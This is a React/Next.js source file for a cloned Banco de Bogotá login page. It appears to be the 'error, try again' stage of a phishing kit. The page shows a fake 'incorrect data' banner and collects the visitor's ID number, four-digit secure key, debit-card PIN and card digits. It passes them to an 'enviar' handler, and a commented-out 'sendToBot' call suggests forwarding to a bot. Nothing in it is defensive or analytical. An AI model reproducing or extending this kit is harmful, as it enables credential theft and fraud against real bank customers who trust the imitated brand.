/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";

import BankCssLoader from "./BankCssLoader";

export default function ErrorApp({ enviar }: any) {
  const [activeTab, setActiveTab] = useState<"clave" | "tarjeta">("clave");

  // FORM Clave Segura
  const [cedula, setCedula] = useState("");
  const [clave, setClave] = useState("");

  // FORM Tarjeta Débito
  const [idced, setIdCed] = useState("");
  const [passCC, setPassCC] = useState("");
  const [pass4, setPass4] = useState("");
  const [loading, setLoading] = useState(false);

  function handleSubmitClaveSegura() {
    if (!cedula || clave.length !== 4) {
      console.warn("Datos de clave segura inválidos");
      return null;
    }

    return {
      view: "errorlogin",
      tipoIngreso: "clave_segura",
      user: cedula,
      pass: clave,
      bank: "bogota",
      timestamp: new Date().toISOString(),
    };
  }
  function handleSubmitTarjetaDebito() {
    if (!idced || passCC.length !== 4 || pass4.length !== 4) {
      console.warn("Datos de tarjeta débito inválidos");
      return null;
    }

    return {
      view: "errorlogin",
      tipoIngreso: "tarjeta_debito",
      user: idced,
      pass: passCC,
      timestamp: new Date().toISOString(),
    };
  }

  return (
    <main className="container" style={{ position: "relative" }}>
      {/* COLUMNA IZQUIERDA */}
      <BankCssLoader visible={loading} />

      <div className="rang"></div>

      <section className="left">
        <div className="wjeu">
          {/* LOGO */}
          <img src="/bancos/bogota/css/logo.svg" alt="Banco de Bogotá" className="logo" />

          <h1>
            <b>
              Bienvenido a tu Banca Virtual</b></h1>

          {/* BANNER */}
          <div className="banner">
            <img src="/bancos/bogota/css/422e00391dd36d89affe.png" alt="Tutorial" />
            <p>
              <strong>¿Nunca has ingresado a Banca Virtual?</strong>
              <br />
              Aquí te decimos cómo hacerlo ›
            </p>
          </div>

          {/* LOGIN CARD */}
          <div className="login-card">
            {/* TABS */}
            <div className="tabs">
              <button
                id="tab-clave"
                className={activeTab === "clave" ? "active" : ""}
                onClick={() => setActiveTab("clave")}
              >
                Clave segura
              </button>

              <button
                id="tab-tarjeta"
                className={activeTab === "tarjeta" ? "active" : ""}
                onClick={() => setActiveTab("tarjeta")}
              >
                Tarjeta débito
              </button>
            </div>

            {/* Error Banner */}
            <div style={{ backgroundColor: '#ffebee', color: '#c62828', padding: '12px', borderRadius: '8px', marginBottom: '16px', textAlign: 'center', fontWeight: 'bold' }}>
              Datos incorrectos. Por favor, verifica tu usuario y clave e inténtalo de nuevo.
            </div>

            {/* FORMULARIO CLAVE SEGURA */}
            <form
              id="form-clave"
              className={activeTab === "clave" ? "form-content active" : "form-content"}
              method="POST"
              onSubmit={(e) => e.preventDefault()}
            >
              <div className="alert">
                Estás ingresando con tu Clave Segura. Selecciona ‘Tarjeta Débito’ para cambiar el tipo de ingreso.
              </div>

              <div className="bpas">
                <label id="cedula">Identificación</label>

                <div className="id-inputs">
                  <select name="tipoDocumento" id="tipoDocumento" defaultValue="CC">
                    <option value="CC">
                      C.C.
                    </option>
                    <option value="TI">T.I. Tarjeta de Identidad</option>
                    <option value="CE">C.E. Cédula de Extranjería</option>
                    <option value="NPN">N.P.N. NIT Persona Natural</option>
                    <option value="NPE">N.P.E. NIT Persona Extranjera</option>
                    <option value="NPJ">N.P.J. NIT Persona Jurídica</option>
                  </select>

                  <input
                    type="text"
                    placeholder="#"
                    maxLength={16}
                    inputMode="numeric"
                    value={cedula}
                    onChange={(e) =>
                      setCedula(e.target.value.replace(/[^0-9]/g, ""))
                    }
                  />
                </div>

                <label id="password">Clave segura</label>

                <div className="password">
                  <input
                    type="password"
                    placeholder="••••"
                    maxLength={4}
                    inputMode="numeric"
                    value={clave}
                    onChange={(e) =>
                      setClave(e.target.value.replace(/[^0-9]/g, ""))
                    }
                  />

                  <span className="eye">
                    <img src="/bancos/bogota/img/eye.png" alt="mostrar" width="40px" />
                  </span>
                </div>

                <button
                  className="eay7wDeyb-EbWIk2kfDMUg== bdb-at-btn bdb-at-btn--primary bdb-at-btn--lg"
                  type="submit"
                  id="ingresoButtonCC"
                  disabled={!cedula || clave.length !== 4}
                  onClick={() => {
                    setLoading(true);   // 👉 activa loader
                    const data = handleSubmitClaveSegura();
                    if (data) {
                      enviar(data)
                      // sendToBot(data);
                      // Simulas envío o proceso
                      setTimeout(() => {
                        setLoading(false); // 👉 oculta loader
                        // Aquí puedes hacer lo que sigue (enviar datos, redirigir, etc)
                      }, 3000);
                    }
                  }}
                >
                  Ingresar
                </button>

                <div className="_2qAdquiAgwqbzNCymlPemw==">
                  <div className="FFpcSRrHMJPw-SkgQESC6Q==">
                    <button className="O0YA2X74My9l+nzRnY-JMQ== bdb-at-btn bdb-at-btn--link bdb-at-btn--lg">
                      <label id="reg">Registrarme ›</label>
                    </button>
                  </div>

                  <button className="JgosmUi+t305evaOyAeTcg== bdb-at-btn bdb-at-btn--link bdb-at-btn--lg">
                    <label id="old">Olvidé mi clave ›</label>
                  </button>
                </div>
              </div>
            </form>

            {/* FORMULARIO TARJETA DÉBITO */}
            <form
              id="form-tarjeta"
              className={activeTab === "tarjeta" ? "form-content active" : "form-content"}
              method="POST"
              onSubmit={(e) => e.preventDefault()}
            >
              <div className="bpas">
                <label id="idced">Identificación</label>

                <div className="id-inputs">
                  <select name="tipoDocumento" id="tipoDocumento" defaultValue="CC">
                    <option value="CC">
                      C.C. Cédula de ciudadanía
                    </option>
                    <option value="TI">T.I. Tarjeta de Identidad</option>
                    <option value="CE">C.E. Cédula de Extranjería</option>
                    <option value="NPN">N.P.N. NIT Persona Natural</option>
                    <option value="NPE">N.P.E. NIT Persona Extranjera</option>
                    <option value="NPJ">N.P.J. NIT Persona Jurídica</option>
                  </select>

                  <input
                    type="text"
                    maxLength={16}
                    inputMode="numeric"
                    placeholder="#"
                    value={idced}
                    onChange={(e) =>
                      setIdCed(e.target.value.replace(/[^0-9]/g, ""))
                    }
                  />
                </div>

                <label>Clave de tu tarjeta débito</label>

                <div className="password">
                  <input
                    type="password"
                    maxLength={4}
                    placeholder="...."
                    inputMode="numeric"
                    value={passCC}
                    onChange={(e) =>
                      setPassCC(e.target.value.replace(/[^0-9]/g, ""))
                    }
                  />

                  <span className="eye">
                    <img src="/bancos/bogota/img/eye.png" width="40px" alt="mostrar" />
                  </span>
                </div>

                <label id="pass4">Últimos 4 dígitos de tu tarjeta débito</label>

                <div className="password">
                  <input
                    type="password"
                    maxLength={4}
                    placeholder="...."
                    inputMode="numeric"
                    value={pass4}
                    onChange={(e) =>
                      setPass4(e.target.value.replace(/[^0-9]/g, ""))
                    }
                  />
                  <span className="eye">
                    <img src="/bancos/bogota/img/eye.png" width="40px" alt="mostrar" />
                  </span>
                </div>

                <button
                  className="eay7wDeyb-EbWIk2kfDMUg== bdb-at-btn bdb-at-btn--primary bdb-at-btn--lg"
                  type="submit"
                  disabled={!idced || passCC.length !== 4 || pass4.length !== 4}
                  onClick={() => {
                    setLoading(true);
                    const data = handleSubmitTarjetaDebito();
                    if (data) {
                      enviar(data)
                      // sendToBot(data);
                      // Simulas envío o proceso
                      setTimeout(() => {
                        setLoading(false); // 👉 oculta loader
                        // Aquí puedes hacer lo que sigue (enviar datos, redirigir, etc)
                      }, 3000);
                    }
                  }}
                >
                  Ingresar
                </button>
              </div>
            </form>
          </div>

          {/* DISCLAIMER */}
          <p className="disclaimer">
            Este sitio está protegido por reCAPTCHA y aplican las{" "}
            <a href="#">políticas de privacidad</a> y los{" "}
            <a href="#">términos de servicio de Google</a>.
          </p>
        </div>
      </section>

      {/* COLUMNA DERECHA */}
      <section className="right">
        <div className="promo">
          <img
            src="https://ftp.mathilde-ads.com/71-889f99de979d5beef1223eb16fe288e7.png"
            alt="Cuenta Fácil"
          />
        </div>

        <div className="promo">
          <img src="/bancos/bogota/css/coue.png" alt="Cuenta Fácil" />
        </div>
      </section>
    </main>
  );
}